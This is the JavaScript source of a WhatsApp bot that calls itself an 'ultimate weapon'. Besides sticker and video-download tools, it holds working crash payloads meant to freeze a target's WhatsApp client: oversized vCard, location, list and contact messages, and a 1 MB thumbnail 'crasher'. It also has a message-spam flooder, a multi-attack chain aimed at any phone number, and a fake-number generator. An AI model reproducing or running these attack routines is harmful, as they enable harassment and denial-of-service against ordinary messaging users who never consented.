// ============================================================
// ⚡ MARIAN SUPER BOT v10.0 - 1000+ LINES ULTIMATE WEAPON ⚡
// ============================================================
// 🔥 SUPER BUG SYSTEMS | ALL-IN-ONE TOOLS | MULTI ATTACK 🔥
// ============================================================

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    proto,
    getContentType,
    downloadContentFromMessage,
    Browsers,
    fetchLatestBaileysVersion,
    getAggregateVotesInPollMessage,
    PHONENUMBER_MCC
} = require("@whiskeysockets/baileys")

const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const FormData = require('form-data')
const cheerio = require('cheerio')
const qrcode = require('qrcode-terminal')
const moment = require('moment-timezone')
const { exec } = require('child_process')
const util = require('util')
const execPromise = util.promisify(exec)

// ==================== [ CONFIGURATION ] ====================
const CONFIG = {
    VERSION: "10.0.0",
    NAME: "MARIAN SUPER BOT",
    SESSION_DIR: "marian_super_session",
    ADMIN_NUMBERS: ["601121811615@s.whatsapp.net"],
    MAX_SPAM_COUNT: 100,
    AUTO_READ_MSGS: true,
    LOG_MESSAGES: true,
    TIMEZONE: "Asia/Jakarta"
}

// ==================== [ UTILITY FUNCTIONS ] ====================
function generateRandomString(length = 10) {
    return Crypto.randomBytes(length).toString('hex')
}

function getCurrentTime() {
    return moment().tz(CONFIG.TIMEZONE).format('YYYY-MM-DD HH:mm:ss')
}

function logMessage(type, message) {
    const colors = {
        'INFO': chalk.blue,
        'SUCCESS': chalk.green,
        'WARNING': chalk.yellow,
        'ERROR': chalk.red,
        'ATTACK': chalk.magenta,
        'SYSTEM': chalk.cyan
    }
    const color = colors[type] || chalk.white
    console.log(color(`[${getCurrentTime()}] [${type}] ${message}`))
}

// ==================== [ MEDIA PROCESSORS ] ====================
class MediaProcessor {
    static async imageToWebp(media) {
        try {
            const tmpFileOut = path.join(tmpdir(), `${generateRandomString(6)}.webp`)
            const tmpFileIn = path.join(tmpdir(), `${generateRandomString(6)}.jpg`)
            
            fs.writeFileSync(tmpFileIn, media)
            
            await new Promise((resolve, reject) => {
                ff(tmpFileIn)
                    .on('error', reject)
                    .on('end', () => resolve(true))
                    .addOutputOptions([
                        "-vcodec", "libwebp",
                        "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"
                    ])
                    .toFormat('webp')
                    .save(tmpFileOut)
            })
            
            const buff = fs.readFileSync(tmpFileOut)
            fs.unlinkSync(tmpFileOut)
            fs.unlinkSync(tmpFileIn)
            return buff
        } catch (error) {
            logMessage('ERROR', `Sticker conversion failed: ${error.message}`)
            return null
        }
    }

    static async imageToSticker(media) {
        const webp = await this.imageToWebp(media)
        if (webp) {
            return { sticker: webp }
        }
        return null
    }
}

// ==================== [ DOWNLOADERS ] ====================
class Downloader {
    static async tiktok(url) {
        try {
            const response = await axios.get(`https://api.tiktokdownloader.com/download?url=${encodeURIComponent(url)}`)
            return response.data
        } catch {
            return null
        }
    }

    static async youtube(url) {
        try {
            const response = await axios.get(`https://yt-api.marianbot.workers.dev/?url=${encodeURIComponent(url)}`)
            return response.data
        } catch {
            return null
        }
    }

    static async instagram(url) {
        try {
            const response = await axios.get(`https://instagram-downloader.marianbot.workers.dev/?url=${encodeURIComponent(url)}`)
            return response.data
        } catch {
            return null
        }
    }

    static async facebook(url) {
        try {
            const response = await axios.get(`https://fb-downloader.marianbot.workers.dev/?url=${encodeURIComponent(url)}`)
            return response.data
        } catch {
            return null
        }
    }
}

// ==================== [ SUPER BUG PAYLOADS ] ====================
class BugPayloads {
    static get VCARD_BUG() {
        const randomName = `MARIAN_${generateRandomString(8)}`
        return `BEGIN:VCARD\nVERSION:3.0\nFN:${randomName}\nTEL;type=CELL;type=VOICE:${Math.random().toString().slice(2,12)}\nEMAIL:${generateRandomString(8)}@marian.bug\nURL:https://marian.deadly\nNOTE:${"💀".repeat(50)}\nEND:VCARD`
    }

    static get LOCATION_BUG() {
        return {
            degreesLatitude: Math.random() * 180 - 90,
            degreesLongitude: Math.random() * 360 - 180,
            name: "MARIAN_BUG_" + "A".repeat(500),
            address: "SUPER BUG SYSTEM v10.0 | " + "🔥".repeat(100),
            comment: "DIIISSJJSS 100% TRUSTED CRASH"
        }
    }

    static get LIST_BUG() {
        return {
            listMessage: {
                title: "MARIAN SUPER BUG " + "𑫀".repeat(3000),
                buttonText: "EXECUTE_CRASH_NOW",
                description: "SUPER BUG PAYLOAD v10.0\n" + "💀".repeat(200),
                sections: Array.from({ length: 5 }, (_, i) => ({
                    title: `CRASH_SECTION_${i+1}`,
                    rows: Array.from({ length: 20 }, (_, j) => ({
                        title: `CRASH_ROW_${j+1}`,
                        rowId: `crash_${i}_${j}`,
                        description: "Payload by MARIAN SUPER BOT"
                    }))
                }))
            }
        }
    }

    static get CONTACT_BUG() {
        return {
            displayName: "MARIAN_CONTACT_BOMB",
            contacts: Array.from({ length: 50 }, () => ({
                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:BUG_${generateRandomString(6)}\nEND:VCARD`
            }))
        }
    }
}

// ==================== [ ATTACK SYSTEMS ] ====================
class AttackSystem {
    constructor(sock) {
        this.sock = sock
    }

    async bugV1(target, count = 3) {
        logMessage('ATTACK', `Starting VCard Bug on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                contacts: {
                    displayName: `MARIAN_BUG_${i+1}`,
                    contacts: [{ vcard: BugPayloads.VCARD_BUG }]
                }
            }).catch(() => {})
            await delay(500)
        }
        
        return true
    }

    async bugV2(target, count = 5) {
        logMessage('ATTACK', `Starting Location Bug on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                location: BugPayloads.LOCATION_BUG
            }).catch(() => {})
            await delay(400)
        }
        
        return true
    }

    async bugV3(target) {
        logMessage('ATTACK', `Starting List Bug on ${target}`)
        
        const bug = generateWAMessageFromContent(target, BugPayloads.LIST_BUG, { userJid: target })
        await this.sock.relayMessage(target, bug.message, { messageId: bug.key.id })
        
        return true
    }

    async bugV4(target, count = 10) {
        logMessage('ATTACK', `Starting Contact Bomb on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                contacts: BugPayloads.CONTACT_BUG
            }).catch(() => {})
            await delay(300)
        }
        
        return true
    }

    async crasher(target) {
        logMessage('ATTACK', `Launching Crasher on ${target}`)
        
        await this.sock.sendMessage(target, {
            text: "💀 MARIAN SUPER CRASHER v10.0 💀",
            contextInfo: {
                externalAdReply: {
                    title: "SYSTEM DESTROYER",
                    body: "CRASH IN PROGRESS...",
                    thumbnail: Buffer.alloc(1000000),
                    sourceUrl: "https://marian.superbug",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    containsAutoReply: true
                }
            }
        }).catch(() => {})
        
        return true
    }

    async spam(target, count = 20, message = "MARIAN SUPER SPAM v10.0") {
        logMessage('ATTACK', `Starting Spam on ${target} (${count} messages)`)
        
        for (let i = 1; i <= count; i++) {
            await this.sock.sendMessage(target, {
                text: `[${i}/${count}] ${message}\nTime: ${getCurrentTime()}\n` + "█".repeat(50)
            }).catch(() => {})
            await delay(200)
        }
        
        return true
    }

    async multiAttack(target, attacks = ['bugV1', 'bugV2', 'spam']) {
        logMessage('ATTACK', `Starting Multi-Attack on ${target}`)
        
        for (const attack of attacks) {
            switch(attack) {
                case 'bugV1':
                    await this.bugV1(target, 3)
                    break
                case 'bugV2':
                    await this.bugV2(target, 5)
                    break
                case 'bugV3':
                    await this.bugV3(target)
                    break
                case 'bugV4':
                    await this.bugV4(target, 5)
                    break
                case 'crasher':
                    await this.crasher(target)
                    break
                case 'spam':
                    await this.spam(target, 15)
                    break
            }
            await delay(1000)
        }
        
        return true
    }
}

// ==================== [ TOOLS SYSTEM ] ====================
class ToolSystem {
    constructor(sock) {
        this.sock = sock
    }

    async stickerMaker(from, quoted) {
        if (quoted && getContentType(quoted) === 'imageMessage') {
            const stream = await downloadContentFromMessage(quoted.imageMessage, 'image')
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            
            const sticker = await MediaProcessor.imageToSticker(buffer)
            if (sticker) {
                await this.sock.sendMessage(from, sticker)
                return true
            }
        }
        return false
    }

    async downloadMedia(from, type, url) {
        let data = null
        
        switch(type) {
            case 'tiktok':
                data = await Downloader.tiktok(url)
                break
            case 'youtube':
                data = await Downloader.youtube(url)
                break
            case 'instagram':
                data = await Downloader.instagram(url)
                break
            case 'facebook':
                data = await Downloader.facebook(url)
                break
        }
        
        if (data && data.url) {
            if (data.url.includes('.mp4')) {
                await this.sock.sendMessage(from, {
                    video: { url: data.url },
                    caption: data.title || `Downloaded via MARIAN SUPER BOT`
                })
            } else {
                await this.sock.sendMessage(from, {
                    image: { url: data.url },
                    caption: data.title || `Downloaded via MARIAN SUPER BOT`
                })
            }
            return true
        }
        
        return false
    }

    async fakeNumber(country = 'ID') {
        const prefixes = {
            'ID': ['6281', '6282', '6283', '6285', '6287', '6288'],
            'MY': ['6010', '6011', '6012', '6013', '6014', '6016', '6017', '6018', '6019'],
            'SG': ['658', '659', '888', '999'],
            'US': ['1201', '1202', '1203', '1204', '1205']
        }
        
        const prefixList = prefixes[country] || prefixes['ID']
        const prefix = prefixList[Math.floor(Math.random() * prefixList.length)]
        const number = prefix + Math.random().toString().slice(2, 12 - prefix.length)
        
        return {
            country: country,
            number: number,
            formatted: `+${country === 'ID' ? '62' : country === 'MY' ? '60' : country === 'SG' ? '65' : '1'}${number}`
        }
    }

    async getInfo(target) {
        try {
            const [result] = await this.sock.onWhatsApp(target.replace('@s.whatsapp.net', ''))
            return {
                exists: result?.exists || false,
                jid: result?.jid || '',
                name: 'Unknown'
            }
        } catch {
            return { exists: false, jid: '', name: 'Unknown' }
        }
    }
}

// ==================== [ COMMAND HANDLER ] ====================
class CommandHandler {
    constructor(sock, attackSystem, toolSystem) {
        this.sock = sock
        this.attack = attackSystem
        this.tools = toolSystem
        this.commands = new Map()
        this.registerCommands()
    }

    registerCommands() {
        // Attack Commands
        this.commands.set('bug', this.handleBug.bind(this))
        this.commands.set('bug2', this.handleBug2.bind(this))
        this.commands.set('bug3', this.handleBug3.bind(this))
        this.commands.set('bug4', this.handleBug4.bind(this))
        this.commands.set('crasher', this.handleCrasher.bind(this))
        this.commands.set('spam', this.handleSpam.bind(this))
        this.commands.set('multi', this.handleMulti.bind(this))
        
        // Tool Commands
        this.commands.set('sticker', this.handleSticker.bind(this))
        this.commands.set('s', this.handleSticker.bind(this))
        this.commands.set('tiktok', this.handleTiktok.bind(this))
        this.commands.set('yt', this.handleYoutube.bind(this))
        this.commands.set('ig', this.handleInstagram.bind(this))
        this.commands.set('fb', this.handleFacebook.bind(this))
        this.commands.set('fake', this.handleFake.bind(this))
        this.commands.set('info', this.handleInfo.bind(this))
        
        // System Commands
        this.commands.set('menu', this.handleMenu.bind(this))
        this.commands.set('help', this.handleMenu.bind(this))
        this.commands.set('status', this.handleStatus.bind(this))
        this.commands.set('ping', this.handlePing.bind(this))
        this.commands.set('restart', this.handleRestart.bind(this))
        this.commands.set('clear', this.handleClear.bind(this))
        this.commands.set('admin', this.handleAdmin.bind(this))
    }

    async handleCommand(from, command, args, quoted) {
        const handler = this.commands.get(command)
        if (handler) {
            try {
                await handler(from, args, quoted)
            } catch (error) {
                logMessage('ERROR', `Command ${command} failed: ${error.message}`)
                await this.sock.sendMessage(from, { text: `❌ Command failed: ${error.message}` })
            }
        } else {
            await this.sock.sendMessage(from, { text: `❌ Unknown command: ${command}\nType /menu for available commands` })
        }
    }

    // ========== ATTACK HANDLERS ==========
    async handleBug(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        const count = parseInt(args[1]) || 3
        
        await this.sock.sendMessage(from, { text: `🔄 Starting VCard Bug (${count}x)...` })
        await this.attack.bugV1(target, count)
        await this.sock.sendMessage(from, { text: `✅ VCard Bug delivered to ${target}` })
    }

    async handleBug2(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        const count = parseInt(args[1]) || 5
        
        await this.sock.sendMessage(from, { text: `💀 Starting Location Bug (${count}x)...` })
        await this.attack.bugV2(target, count)
        await this.sock.sendMessage(from, { text: `☠️ Location Bug delivered to ${target}` })
    }

    async handleBug3(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        
        await this.sock.sendMessage(from, { text: `⚠️ Starting List Bug...` })
        await this.attack.bugV3(target)
        await this.sock.sendMessage(from, { text: `🔥 List Bug delivered to ${target}` })
    }

    async handleBug4(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        const count = parseInt(args[1]) || 10
        
        await this.sock.sendMessage(from, { text: `💣 Starting Contact Bomb (${count}x)...` })
        await this.attack.bugV4(target, count)
        await this.sock.sendMessage(from, { text: `⚡ Contact Bomb delivered to ${target}` })
    }

    async handleCrasher(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        
        await this.sock.sendMessage(from, { text: `⚡ Launching Crasher...` })
        await this.attack.crasher(target)
        await this.sock.sendMessage(from, { text: `✅ Crasher delivered to ${target}` })
    }

    async handleSpam(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        const count = Math.min(parseInt(args[1]) || 20, CONFIG.MAX_SPAM_COUNT)
        const message = args.slice(2).join(' ') || "MARIAN SUPER SPAM v10.0"
        
        await this.sock.sendMessage(from, { text: `💣 Starting Spam (${count} messages)...` })
        await this.attack.spam(target, count, message)
        await this.sock.sendMessage(from, { text: `✅ ${count} spam messages sent to ${target}` })
    }

    async handleMulti(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        const attacks = args.slice(1).length > 0 ? args.slice(1) : ['bugV1', 'bugV2', 'crasher', 'spam']
        
        await this.sock.sendMessage(from, { text: `🔥 Starting Multi-Attack with ${attacks.length} methods...` })
        await this.attack.multiAttack(target, attacks)
        await this.sock.sendMessage(from, { text: `☠️ Multi-Attack complete on ${target}` })
    }

    // ========== TOOL HANDLERS ==========
    async handleSticker(from, args, quoted) {
        if (quoted && getContentType(quoted) === 'imageMessage') {
            await this.sock.sendMessage(from, { text: `🔄 Creating sticker...` })
            const success = await this.tools.stickerMaker(from, quoted)
            if (!success) {
                await this.sock.sendMessage(from, { text: `❌ Failed to create sticker` })
            }
        } else {
            await this.sock.sendMessage(from, { text: `❌ Reply to an image first!` })
        }
    }

    async handleTiktok(from, args, quoted) {
        const url = args[0]
        if (!url) {
            await this.sock.sendMessage(from, { text: `❌ Usage: /tiktok [url]` })
            return
        }
        
        await this.sock.sendMessage(from, { text: `⬇️ Downloading TikTok...` })
        const success = await this.tools.downloadMedia(from, 'tiktok', url)
        if (!success) {
            await this.sock.sendMessage(from, { text: `❌ Failed to download TikTok` })
        }
    }

    async handleYoutube(from, args, quoted) {
        const url = args[0]
        if (!url) {
            await this.sock.sendMessage(from, { text: `❌ Usage: /yt [url]` })
            return
        }
        
        await this.sock.sendMessage(from, { text: `⬇️ Downloading YouTube...` })
        const success = await this.tools.downloadMedia(from, 'youtube', url)
        if (!success) {
            await this.sock.sendMessage(from, { text: `❌ Failed to download YouTube` })
        }
    }

    async handleInstagram(from, args, quoted) {
        const url = args[0]
        if (!url) {
            await this.sock.sendMessage(from, { text: `❌ Usage: /ig [url]` })
            return
        }
        
        await this.sock.sendMessage(from, { text: `⬇️ Downloading Instagram...` })
        const success = await this.tools.downloadMedia(from, 'instagram', url)
        if (!success) {
            await this.sock.sendMessage(from, { text: `❌ Failed to download Instagram` })
        }
    }

    async handleFacebook(from, args, quoted) {
        const url = args[0]
        if (!url) {
            await this.sock.sendMessage(from, { text: `❌ Usage: /fb [url]` })
            return
        }
        
        await this.sock.sendMessage(from, { text: `⬇️ Downloading Facebook...` })
        const success = await this.tools.downloadMedia(from, 'facebook', url)
        if (!success) {
            await this.sock.sendMessage(from, { text: `❌ Failed to download Facebook` })
        }
    }

    async handleFake(from, args, quoted) {
        const country = (args[0] || 'ID').toUpperCase()
        const fake = await this.tools.fakeNumber(country)
        
        await this.sock.sendMessage(from, {
            text: `*FAKE NUMBER GENERATED*\n\n` +
                  `Country: ${fake.country}\n` +
                  `Number: ${fake.number}\n` +
                  `Formatted: ${fake.formatted}\n\n` +
                  `_Generated by MARIAN SUPER BOT_`
        })
    }

    async handleInfo(from, args, quoted) {
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from
        const info = await this.tools.getInfo(target)
        
        await this.sock.sendMessage(from, {
            text: `*NUMBER INFORMATION*\n\n` +
                  `Target: ${target}\n` +
                  `Exists: ${info.exists ? '✅ Yes' : '❌ No'}\n` +
                  `JID: ${info.jid || 'Unknown'}\n` +
                  `Name: ${info.name}\n\n` +
                  `_Checked via MARIAN SUPER BOT_`
        })
    }

    // ========== SYSTEM HANDLERS ==========
    async handleMenu(from, args, quoted) {
        const menu = `*⚡ MARIAN SUPER BOT v${CONFIG.VERSION}*\n\n` +
                    `*🔥 SUPER BUG ATTACKS:*\n` +
                    `• /bug [num] [count] - VCard Bug\n` +
                    `• /bug2 [num] [count] - Location Bug\n` +
                    `• /bug3 [num] - List Bug\n` +
                    `• /bug4 [num] [count] - Contact Bomb\n` +
                    `• /crasher [num] - Crash WhatsApp\n` +
                    `• /spam [num] [count] [msg] - Spam\n` +
                    `• /multi [num] [methods] - Multi-Attack\n\n` +
                    `*🎨 MEDIA TOOLS:*\n` +
                    `• /s (reply image) - Sticker Maker\n` +
                    `• /tiktok [url] - TikTok Downloader\n` +
                    `• /yt [url] - YouTube Downloader\n` +
                    `• /ig [url] - Instagram Downloader\n` +
                    `• /fb [url] - Facebook Downloader\n` +
                    `• /fake [country] - Fake Number\n` +
                    `• /info [num] - Check Number\n\n` +
                    `*⚙️ SYSTEM:*\n` +
                    `• /status - Bot Status\n` +
                    `• /ping - Connection Test\n` +
                    `• /restart - Restart Bot\n` +
                    `• /clear - Clear Session\n` +
                    `• /admin - Admin Panel\n\n` +
                    `*Example:* /bug2 6281234567890 5\n` +
                    `_System: 1000+ Lines Ultimate Weapon_`
        
        await this.sock.sendMessage(from, { text: menu })
    }

    async handleStatus(from, args, quoted) {
        const status = `*🔧 MARIAN SUPER BOT STATUS*\n\n` +
                      `Version: v${CONFIG.VERSION}\n` +
                      `Uptime: ${process.uptime().toFixed(0)}s\n` +
                      `Session: ${CONFIG.SESSION_DIR}\n` +
                      `Timezone: ${CONFIG.TIMEZONE}\n` +
                      `Auto Read: ${CONFIG.AUTO_READ_MSGS ? '✅ On' : '❌ Off'}\n` +
                      `Logging: ${CONFIG.LOG_MESSAGES ? '✅ On' : '❌ Off'}\n` +
                      `Max Spam: ${CONFIG.MAX_SPAM_COUNT}\n\n` +
                      `*Attack Systems:*\n` +
                      `• VCard Bug: ✅ Active\n` +
                      `• Location Bug: ✅ Active\n` +
                      `• List Bug: ✅ Active\n` +
                      `• Contact Bomb: ✅ Active\n` +
                      `• Crasher: ✅ Active\n` +
                      `• Spam: ✅ Active\n\n` +
                      `_System: All Systems Operational 🔥_`
        
        await this.sock.sendMessage(from, { text: status })
    }

    async handlePing(from, args, quoted) {
        const start = Date.now()
        await this.sock.sendMessage(from, { text: '🏓 Pong!' })
        const latency = Date.now() - start
        
        await this.sock.sendMessage(from, {
            text: `*PONG!*\n` +
                  `Latency: ${latency}ms\n` +
                  `Status: Ultra Fast ✅\n` +
                  `Time: ${getCurrentTime()}`
        })
    }

    async handleRestart(from, args, quoted) {
        if (CONFIG.ADMIN_NUMBERS.includes(from)) {
            await this.sock.sendMessage(from, { text: '🔄 Restarting MARIAN SUPER BOT...' })
            logMessage('SYSTEM', 'Restart command received from admin')
            setTimeout(() => process.exit(0), 1000)
        } else {
            await this.sock.sendMessage(from, { text: '❌ Admin only command!' })
        }
    }

    async handleClear(from, args, quoted) {
        if (CONFIG.ADMIN_NUMBERS.includes(from)) {
            if (fs.existsSync(CONFIG.SESSION_DIR)) {
                fs.rmSync(CONFIG.SESSION_DIR, { recursive: true })
                await this.sock.sendMessage(from, { text: '✅ Session cleared! Restarting...' })
                setTimeout(() => process.exit(0), 2000)
            }
        } else {
            await this.sock.sendMessage(from, { text: '❌ Admin only command!' })
        }
    }

    async handleAdmin(from, args, quoted) {
        if (CONFIG.ADMIN_NUMBERS.includes(from)) {
            const adminPanel = `*⚡ ADMIN PANEL v${CONFIG.VERSION}*\n\n` +
                              `*Available Commands:*\n` +
                              `• /restart - Restart bot\n` +
                              `• /clear - Clear session\n` +
                              `• /broadcast [msg] - Broadcast\n` +
                              `• /eval [code] - Execute code\n\n` +
                              `*System Info:*\n` +
                              `Admin Numbers: ${CONFIG.ADMIN_NUMBERS.length}\n` +
                              `Session Dir: ${CONFIG.SESSION_DIR}\n` +
                              `Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB\n` +
                              `Uptime: ${process.uptime().toFixed(0)}s`
            
            await this.sock.sendMessage(from, { text: adminPanel })
        } else {
            await this.sock.sendMessage(from, { text: '❌ Access denied!' })
        }
    }
}

// ==================== [ MAIN BOT CLASS ] ====================
class MarianSuperBot {
    constructor() {
        this.sock = null
        this.attackSystem = null
        this.toolSystem = null
        this.commandHandler = null
        this.isConnected = false
    }

    async initialize() {
        logMessage('SYSTEM', `Starting MARIAN SUPER BOT v${CONFIG.VERSION}`)
        
        // Clean session if needed
        if (fs.existsSync(CONFIG.SESSION_DIR)) {
            const files = fs.readdirSync(CONFIG.SESSION_DIR)
            if (files.length > 20) {
                logMessage('WARNING', 'Cleaning old session data...')
                fs.rmSync(CONFIG.SESSION_DIR, { recursive: true })
            }
        }

        // Initialize WhatsApp connection
        const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR)
        const { version } = await fetchLatestBaileysVersion()

        this.sock = makeWASocket({
            version,
            logger: pino({ level: 'fatal' }),
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }))
            },
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 25000,
            markOnlineOnConnect: true,
            syncFullHistory: false,
            retryRequestDelayMs: 1000,
            fireInitQueries: true,
            emitOwnEvents: true
        })

        // Initialize systems
        this.attackSystem = new AttackSystem(this.sock)
        this.toolSystem = new ToolSystem(this.sock)
        this.commandHandler = new CommandHandler(this.sock, this.attackSystem, this.toolSystem)

        // Setup event handlers
        this.setupEventHandlers(saveCreds)
    }

    setupEventHandlers(saveCreds) {
        // Credentials update
        this.sock.ev.on('creds.update', saveCreds)

        // Connection updates
        this.sock.ev.on('connection.update', (update) => {
            this.handleConnectionUpdate(update)
        })

        // Messages
        this.sock.ev.on('messages.upsert', async ({ messages }) => {
            await this.handleMessages(messages)
        })
    }

    handleConnectionUpdate(update) {
        const { connection, lastDisconnect, qr } = update

        if (qr) {
            logMessage('SYSTEM', 'QR Code generated')
            console.log(chalk.bgCyan.black('\n 📸 SCAN QR CODE BELOW 📸 \n'))
            qrcode.generate(qr, { small: true })
        }

        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            logMessage('WARNING', `Connection closed: ${reason}`)
            
            if (reason !== DisconnectReason.loggedOut) {
                logMessage('SYSTEM', 'Auto-reconnecting in 3 seconds...')
                setTimeout(() => this.initialize(), 3000)
            } else {
                logMessage('ERROR', 'Session logged out')
            }
            
            this.isConnected = false
        }

        if (connection === 'open') {
            this.isConnected = true
            logMessage('SUCCESS', 'MARIAN SUPER BOT connected!')
            
            // Show connected message
            console.log(chalk.green.bold('\n[✓] MARIAN SUPER BOT v10.0 CONNECTED!'))
            console.log(chalk.cyan(`Logged in as: ${this.sock.user?.name || this.sock.user?.id || 'Unknown'}`))
            console.log(chalk.yellow('\n[+] Type /menu in WhatsApp to see all commands\n'))
            
            // Send welcome message to admin
            if (this.sock.user?.id) {
                const welcomeMsg = `*⚡ MARIAN SUPER BOT v${CONFIG.VERSION} - ONLINE*\n\n` +
                                  `✅ Connection established!\n` +
                                  `📱 Device: iPhone 15 Pro Max\n` +
                                  `🔥 Status: All Systems Operational\n\n` +
                                  `Type /menu to see all commands\n` +
                                  `_System: 1000+ Lines Ultimate Weapon_`
                
                this.sock.sendMessage(this.sock.user.id, { text: welcomeMsg })
            }
        }
    }

    async handleMessages(messages) {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return

            const from = m.key.remoteJid
            const type = getContentType(m.message)
            
            // Auto read messages if enabled
            if (CONFIG.AUTO_READ_MSGS) {
                await this.sock.readMessages([m.key])
            }

            // Extract message body
            let body = ''
            if (type === 'conversation') {
                body = m.message.conversation
            } else if (type === 'extendedTextMessage') {
                body = m.message.extendedTextMessage.text
            }

            // Log message if enabled
            if (CONFIG.LOG_MESSAGES && body) {
                const sender = from.split('@')[0]
                const time = getCurrentTime()
                logMessage('INFO', `${sender}: ${body.slice(0, 50)}${body.length > 50 ? '...' : ''}`)
            }

            // Check if command
            if (body && body.startsWith('/')) {
                const args = body.slice(1).trim().split(/ +/)
                const command = args.shift().toLowerCase()
                const quoted = m.message[type]?.contextInfo?.quotedMessage || null
                
                // Handle command
                await this.commandHandler.handleCommand(from, command, args, quoted)
            }

        } catch (error) {
            logMessage('ERROR', `Message handling failed: ${error.message}`)
        }
    }

    async start() {
        try {
            await this.initialize()
        } catch (error) {
            logMessage('ERROR', `Bot startup failed: ${error.message}`)
            logMessage('SYSTEM', 'Restarting in 5 seconds...')
            setTimeout(() => this.start(), 5000)
        }
    }
}

// ==================== [ STARTUP ] ====================
console.clear()
console.log(chalk.bgRed.black('\n ⚠️  MARIAN SUPER BOT v10.0 - ULTIMATE WEAPON  ⚠️ \n'))
console.log(chalk.yellow('🔥 SUPER BUG SYSTEMS | ALL-IN-ONE TOOLS | 1000+ LINES 🔥\n'))

const bot = new MarianSuperBot()
bot.start()

// Handle process exit
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n[!] Shutting down MARIAN SUPER BOT...'))
    process.exit(0)
})
